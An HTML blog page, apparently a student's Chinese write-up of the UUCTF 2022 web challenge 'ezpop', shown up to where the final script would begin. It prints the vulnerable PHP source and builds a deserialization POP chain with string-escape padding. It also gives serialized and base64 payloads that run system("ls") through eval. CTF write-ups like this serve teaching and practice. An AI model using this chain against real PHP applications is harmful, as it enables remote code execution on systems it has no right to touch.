@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="UUCTF_2022新生赛web方向WP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UUCTF_2022新生赛(web)WP">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/18581.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="UUCTF_2022新生赛web方向WP">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67b49075d0e0a243d400916a.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67b72c59d0e0a243d4010ef4.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67b731b5d0e0a243d4010fe3.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67b73afcd0e0a243d4011266.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67b73b6bd0e0a243d4011273.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67b73d1ad0e0a243d40112b4.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67b7443fd0e0a243d4011428.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67b846ccd0e0a243d4015de5.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67b86675d0e0a243d401672a.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67b88fa6d0e0a243d40171b2.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67b89015d0e0a243d40171be.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67b89695d0e0a243d40172cb.png">
+<meta property="article:published_time" content="2025-02-18T09:07:23.000Z">
+<meta property="article:modified_time" content="2025-02-21T15:48:06.247Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67b49075d0e0a243d400916a.png">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/18581.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>UUCTF_2022新生赛(web)WP | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">12</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">9</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">46</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/18581.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          UUCTF_2022新生赛(web)WP
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-02-18 17:07:23" itemprop="dateCreated datePublished" datetime="2025-02-18T17:07:23+08:00">2025-02-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-02-21 23:48:06" itemprop="dateModified" datetime="2025-02-21T23:48:06+08:00">2025-02-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+      
+      
+        <p>UUCTF_2022新生赛web方向WP</p>
+<span id="more"></span>
+
+<h1 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h1><p>题目</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UUCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>,<span class="variable">$key</span>,<span class="variable">$basedata</span>,<span class="variable">$ob</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key===<span class="string">&quot;UUCTF&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ob=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;basedata));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;oh!you should learn PHP unserialize String escape!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">output</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">rce</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nothing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;t;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">youwant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">rce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pdata</span>=<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$pdata</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">UUCTF</span>(<span class="variable">$pdata</span>));</span><br><span class="line">    <span class="variable">$data_replace</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;hacker&quot;</span>,<span class="string">&quot;loveuu!&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data_replace</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>一道反序列化链题目<br>首先要找到反序列化链，我们最终要执行的是youwant类中的eval函数，就要执行rce这个方法<br>rce这个方法在output类中的__toString()方法调用，__toString()要怎么调用呢<br>在nothing类中有die函数，这个函数执行的时候就回调用__toString()。<br>但是nothing类中有wakeup魔法函数，他会重置，我们想要绕过，但是之前常用的方法在这里不能用<br>原因是__wakeup () 绕过漏洞存在的版本需要满足  PHP5 &lt; 5.6.25     PHP7 &lt; 7.0.10<br>但是这里给了我们一个解决方法，__destruct()中除了die函数，还有一个<code>$this-&gt;b=$this-&gt;t;</code><br>既然a会被重置，但是这里b又会被赋值，那只要把a和b的地址公用就可以了，这样b被修改的时候，a也会被修改<br>pop链： youwant:rce() -&gt; output:tostring() -&gt; nothing:__destruct()</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">output</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nothing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">youwant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">youwant</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; cmd = <span class="string">&#x27;system(&quot;ls&quot;)&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">output</span>();</span><br><span class="line"><span class="variable">$b</span> -&gt; a = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">nothing</span>();</span><br><span class="line"><span class="variable">$c</span> -&gt; a = &amp;<span class="variable">$c</span> -&gt; b;</span><br><span class="line"><span class="variable">$c</span> -&gt; t = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"> O:<span class="number">7</span>:<span class="string">&quot;nothing&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;N;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;R:<span class="number">2</span>;s:<span class="number">1</span>:<span class="string">&quot;t&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;output&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;youwant&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;cmd&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;system(&quot;</span>ls<span class="string">&quot;);&quot;</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+<p>上面的结果是不考虑后面的代码</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pdata</span>=<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$pdata</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">UUCTF</span>(<span class="variable">$pdata</span>));</span><br><span class="line">    <span class="variable">$data_replace</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;hacker&quot;</span>,<span class="string">&quot;loveuu!&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data_replace</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>我们上面构造的序列化的是nothing类，但是这里序列化的是UUCTF类，所以要进行<code>反序列化字符逃逸</code><br>因为UUCTF这个类明显是无法达到我们的目的的。<br>但是在这个类中</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="KOTLIN"><figure class="iseeu highlight /kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($<span class="keyword">this</span>-&gt;key===<span class="string">&quot;UUCTF&quot;</span>)&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;ob=unserialize(base64_decode($<span class="keyword">this</span>-&gt;basedata));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
+<p>这里也有反序列化操作，所以如果让这里的basedata为我们上面构造的base64编码<br>然后这个是在wakeup中，在最后代码中的<code>unserialize($data_replace);</code>中反序列化后wakeup就会执行。<br>所以我们可以构造</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UUCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>,<span class="variable">$key</span>,<span class="variable">$basedata</span>,<span class="variable">$ob</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">UUCTF</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;key=<span class="string">&quot;UUCTF&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;basedata = <span class="string">&quot;Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjEzOiJzeXN0ZW0oImxzIik7Ijt9fX0=&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"> </span><br><span class="line"> O:<span class="number">5</span>:<span class="string">&quot;UUCTF&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;UUCTF&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;basedata&quot;</span>;s:<span class="number">164</span>:<span class="string">&quot;Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjEzOiJzeXN0ZW0oImxzIik7Ijt9fX0=&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ob&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure></div>
+<p>这个结果才是我们想要的，但是在最后的代码中<code>$data=serialize(new UUCTF($pdata));</code><br>这里的<code>$pdata</code>控制的是name，但是为了能够调用eval函数，就必须让basedata是我们上面构造的序列化字符，UUCTF类的key也必须是”UUCTF”，所以我们要进行字符逃逸。<br>字符串逃逸又是什么呢？<br>在最后的代码中实行<code>$data_replace=str_replace(&quot;hacker&quot;,&quot;loveuu!&quot;,$data);</code>每次会把hacker 替换成loveuu!  6个字符替换成了7个字符，但是序列化字符串格式前面的个数是没变的，替换就会长度不匹配导致反序列化操作失败<br>题目中的序列化字符串的基本形式是<br>O:5:”UUCTF”:4:{s:4:”name”;s:3:”abc”;s:3:”key”;N;s:8:”basedata”;N;s:2:”ob”;N;}<br>我们能控制的只有name<br>上面我们构造的第二个序列化结果中name后面的是</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;UUCTF&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;basedata&quot;</span>;s:<span class="number">164</span>:<span class="string">&quot;Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjEzOiJzeXN0ZW0oImxzIik7Ijt9fX0=&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ob&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure></div>
+<p>比如一共是262个字符（后面用strlen计算），因为我们每有一个hacker就会让替换后的字符多1，所以我们构造262个hacker<br><code>262+6*262=7*262=1834 </code><br>还记得我们最开始构造UUCTF类的结果吗，现在我们拆成3个部分</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#第一部分</span></span><br><span class="line">O<span class="punctuation">:</span><span class="number">5</span><span class="punctuation">:</span><span class="string">&quot;UUCTF&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">:</span>&#123;s<span class="punctuation">:</span><span class="number">4</span><span class="punctuation">:</span><span class="string">&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#第二部分</span></span><br><span class="line">name</span><br><span class="line"></span><br><span class="line"><span class="meta">#第三部分</span></span><br><span class="line"><span class="string">&quot;;s:3:&quot;</span>key<span class="string">&quot;;s:5:&quot;</span>UUCTF<span class="string">&quot;;s:8:&quot;</span>basedata<span class="string">&quot;;s:164:&quot;</span>Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjEzOiJzeXN0ZW0oImxzIik7Ijt9fX0<span class="punctuation">=</span><span class="string">&quot;;s:2:&quot;</span>ob<span class="string">&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure>
+<p>我这么拆分的意义也很明显了，就是让name变成替换的loveuu!<br>替换之后就是</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">5</span>:<span class="string">&quot;UUCTF&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">1834</span>:<span class="string">&quot;262 个 loveuu!&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;UUCTF&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;basedata&quot;</span>;s:<span class="number">164</span>:<span class="string">&quot;Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjEzOiJzeXN0ZW0oImxzIik7Ijt9fX0=&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ob&quot;</span>;N;&#125; s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;N;s:<span class="number">8</span>:<span class="string">&quot;basedata&quot;</span>;N;s:<span class="number">2</span>:<span class="string">&quot;ob&quot;</span>;N;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>反序列化函数看到<code>；&#125; </code>就当作结束符号，后面的都会忽略掉<br>完整的代码</p>
